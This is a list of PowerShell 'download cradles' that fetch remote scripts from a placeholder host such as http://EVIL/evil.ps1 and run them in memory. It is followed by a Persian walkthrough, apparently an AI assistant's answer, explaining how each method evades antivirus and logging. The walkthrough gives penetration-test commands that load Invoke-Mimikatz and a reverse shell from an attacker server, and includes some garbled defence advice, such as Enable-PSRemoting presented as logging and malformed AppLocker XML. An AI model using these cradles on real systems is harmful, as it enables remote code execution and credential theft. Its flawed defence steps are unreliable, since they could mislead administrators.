
# normal download cradle
IEX (New-Object Net.Webclient).downloadstring("http://EVIL/evil.ps1")

# PowerShell 3.0+
IEX (iwr 'http://EVIL/evil.ps1')

# hidden IE com object
$ie=New-Object -comobject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://EVIL/evil.ps1');start-sleep -s 5;$r=$ie.Document.body.innerHTML;$ie.quit();IEX $r

# Msxml2.XMLHTTP COM object
$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText

# WinHttp COM object (not proxy aware!)
$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText

# using bitstransfer- touches disk!
Import-Module bitstransfer;Start-BitsTransfer 'http://EVIL/evil.ps1' $env:temp\t;$r=gc $env:temp\t;rm $env:temp\t; iex $r

# DNS TXT approach from PowerBreach (https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerBreach/PowerBreach.ps1)
#   code to execute needs to be a base64 encoded string stored in a TXT record
IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(((nslookup -querytype=txt "SERVER" | Select -Pattern '"*"') -split '"'[0]))))

# from @subtee - https://gist.github.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d
<#
<?xml version="1.0"?>
<command>
   <a>
      <execute>Get-Process</execute>
   </a>
  </command>
#>
$a = New-Object System.Xml.XmlDocument
$a.Load("https://gist.githubusercontent.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d/raw/1ffde429dc4a05f7bc7ffff32017a3133634bc36/gistfile1.txt")
$a.command.a.execute | iex


<script src="https://gist.github.com/HarmJ0y/bb48307ffa663256e239.js"></script>

---
---
---


**این یه لیست از روش‌های مختلف برای دانلود و اجرای کد PowerShell از راه دور هست (اصطلاحاً "Download Cradles")**

---

## **🎯 این لیست چیه؟**
این‌ها **تکنیک‌های دانلود و اجرای کود از راه دور** در PowerShell هستند که توسط **هکرها/تست نفوذگرها** برای:
1. **دانلود اسکریپت‌های مخرب** بدون ذخیره روی دیسک
2. **اجرای کد در حافظه (Memory)** بدون ردپا
3. **دور زدن آنتی‌ویروس‌ها**

---

## **🔍 تحلیل هر روش:**

### **۱. روش معمول (کلاسیک):**
```powershell
IEX (New-Object Net.Webclient).downloadstring("http://EVIL/evil.ps1")
```
**چکار میکنه:**  
- از کلاس `Net.Webclient` استفاده می‌کنه  
- محتوای اسکریپت رو دانلود می‌کنه  
- با `IEX` (Invoke-Expression) اون رو اجرا می‌کنه  
**ضعف:** خیلی شناخته شده، آنتی‌ویروس بلکه می‌کنه

---

### **۲. PowerShell 3.0+ (iwr = Invoke-WebRequest):**
```powershell
IEX (iwr 'http://EVIL/evil.ps1')
```
**چکار میکنه:**  
- از cmdlet جدیدتر `Invoke-WebRequest` استفاده می‌کنه  
- ساده‌تر و قابل‌خواندن‌تر  
**کاربرد:** در سیستم‌های جدیدتر

---

### **۳. شیء مخفی Internet Explorer:**
```powershell
$ie=New-Object -comobject InternetExplorer.Application
$ie.visible=$False
$ie.navigate('http://EVIL/evil.ps1')
start-sleep -s 5
$r=$ie.Document.body.innerHTML
$ie.quit()
IEX $r
```
**چکار میکنه:**  
- یه شیء IE می‌سازه (اما مخفی)  
- به URL موردنظر می‌ره و محتوا رو می‌گیره  
- HTML رو استخراج می‌کنه و اجرا می‌کنه  
**مزیت:** شبیه مرورگر عادی رفتار می‌کنه، کمتر suspicion ایجاد می‌کنه

---

### **۴. شیء XMLHTTP (شبیه AJAX):**
```powershell
$h=New-Object -ComObject Msxml2.XMLHTTP
$h.open('GET','http://EVIL/evil.ps1',$false)
$h.send()
iex $h.responseText
```
**چکار میکنه:**  
- از COM object `Msxml2.XMLHTTP` استفاده می‌کنه  
- درخواست HTTP می‌فرسته  
- پاسخ رو دریافت و اجرا می‌کنه  
**مزیت:** سبک‌تر از IE، بدون پنجره

---

### **۵. شیء WinHttp (غیر proxy-aware):**
```powershell
$h=new-object -com WinHttp.WinHttpRequest.5.1
$h.open('GET','http://EVIL/evil.ps1',$false)
$h.send()
iex $h.responseText
```
**چکار میکنه:**  
- مشابه روش قبلی اما با `WinHttp`  
- **عیب:** تنظیمات proxy سیستم رو نمی‌بینه

---

### **۶. استفاده از BITS (Background Intelligent Transfer Service):**
```powershell
Import-Module bitstransfer
Start-BitsTransfer 'http://EVIL/evil.ps1' $env:temp\t
$r=gc $env:temp\t
rm $env:temp\t
iex $r
```
**چکار میکنه:**  
- از سرویس **BITS** ویندوز استفاده می‌کنه (برای آپدیت‌ها)  
- فایل رو موقتاً روی دیسک ذخیره می‌کنه  
- می‌خونه و پاک می‌کنه  
**مزیت:** کمتر suspicion، چون BITS برای آپدیت‌های قانونی استفاده میشه

---

### **۷. روش DNS TXT (بسیار مخفی):**
```powershell
IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(
    ((nslookup -querytype=txt "SERVER" | Select -Pattern '"*"') -split '"')[0]
)))
```
**چکار میکنه:**  
- کد Base64 شده رو از **DNS TXT records** می‌خونه  
- رمزگشایی می‌کنه و اجرا می‌کنه  
**مزیت:** هیچ اتصال HTTP/S مستقیمی نداره، فقط DNS

---

### **۸. روش XML از URL (پیشرفته):**
```powershell
$a = New-Object System.Xml.XmlDocument
$a.Load("https://gist.githubusercontent.com/.../gistfile1.txt")
$a.command.a.execute | iex
```
**چکار میکنه:**  
- یک فایل XML از اینترنت لود می‌کنه  
- تگ `<execute>` رو پیدا می‌کنه  
- محتواش رو اجرا می‌کنه  
**مزیت:** می‌تونه کد رو در XML پنهان کنه

---

## **🎯 چرا این‌همه روش مختلف؟**

### **برای دور زدن دفاع‌ها:**
1. **امضای آنتی‌ویروس** - هر روش امضای متفاوتی داره
2. **لاگ‌گیری شبکه** - بعضی روش‌ها کمتر لاگ می‌خورن
3. **محدودیت‌های امنیتی** - بعضی cmdlet‌ها محدود شدن
4. **شناسایی رفتار** - الگوهای مختلف برای شناسایی سخت‌تر

---

## **🛡️ دفاع در برابر این حملات:**

### **برای Sysadmin/دفاع:**
```powershell
# ۱. لاگ‌گیری PowerShell
Enable-PSRemoting -Force
Set-ExecutionPolicy -ExecutionPolicy Restricted

# ۲. مانیتورینگ
# لاگ‌های PowerShell رو چک کن
Get-WinEvent -LogName "Windows PowerShell" | Where-Object {$_.Id -eq 4100}

# ۳. محدود کردن
# غیرفعال کردن دانلود
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell" `
    -Name "ExecutionPolicy" -Value "Restricted" -PropertyType String -Force
```

### **قوانین AppLocker/SRP:**
```xml
<!-- جلوگیری از اجرای PowerShell از اینترنت -->
<Rule Type="Path" Action="Deny" Id="1">
    <Conditions>
        <FileCondition Path="%INTERNETZONE%" />
    </Conditions>
</Rule>
```

---

## **🎓 در OSCP/تست نفوذ:**

### **چه موقع از این‌ها استفاده می‌کنی؟**

#### **سناریو ۱: دانلود PowerSploit/Mimikatz**
```powershell
# روی سیستم قربانی اجرا کن
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1'); Invoke-Mimikatz"
```

#### **سناریو ۲: Reverse Shell**
```powershell
# از Kali اسکریپت رو میزبانی کن
python3 -m http.server 80

# روی ویندوز قربانی:
IEX (iwr http://10.10.10.10/revshell.ps1)
```

#### **سناریو ۳: دانلود بدون IEX (برای بعضی فیلترها)**
```powershell
# اگر IEX فیلتر شده
$d = (New-Object Net.WebClient).DownloadString("http://10.10.10.10/shell.ps1")
Invoke-Expression $d
```

---

## **🔧 خلاصه کاربرد هر روش:**

| روش | مزیت | معایب | استفاده در |
|-----|------|-------|-----------|
| **Net.WebClient** | ساده، همه جا کار می‌کنه | خیلی شناخته شده | تست‌های عمومی |
| **Invoke-WebRequest** | توکار PowerShell | نیاز به PS 3.0+ | سیستم‌های جدید |
| **Internet Explorer** | کمتر suspicion | سنگین، پنجره موقت | محیط‌های محدود |
| **XMLHTTP** | سبک، بدون پنجره | COM object ممکنه نباشد | سرورهای ویندوز |
| **BITS** | استفاده از سرویس قانونی | روی دیسک می‌ره | دور زدن فایروال |
| **DNS TXT** | مخفی، فقط DNS | پیچیده | محیط‌های امنیتی بالا |
| **XML از URL** | پنهان‌سازی در XML | نیاز به پارس کردن | حملات پیشرفته |

---

## **⚠️ هشدار مهم:**
این تکنیک‌ها **فقط برای**:
- تست نفوذ با مجوز
- آموزش امنیت
- تست سیستم‌های خودتان

استفاده بدون مجوز **جرم است**.

---

## **🎯 تمرین عملی در محیط آزمایشی:**

### **ایجاد یک Cradle ساده:**
```powershell
# روی Kali/سرور شما:
echo "Get-Process | Out-File C:\temp\processes.txt" > evil.ps1
python3 -m http.server 80

# روی ویندوز آزمایشی (VM):
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/evil.ps1')"
```

### **مشاهده لاگ‌ها:**
```powershell
# روی همان ویندوز ببین چه اتفاقی افتاده:
Get-EventLog -LogName "Windows PowerShell" -Newest 10 | Format-List
```

---

**آیا می‌خوای درباره روش خاصی بیشتر بدونی یا نحوه دفاع در برابرش رو یاد بگیری؟**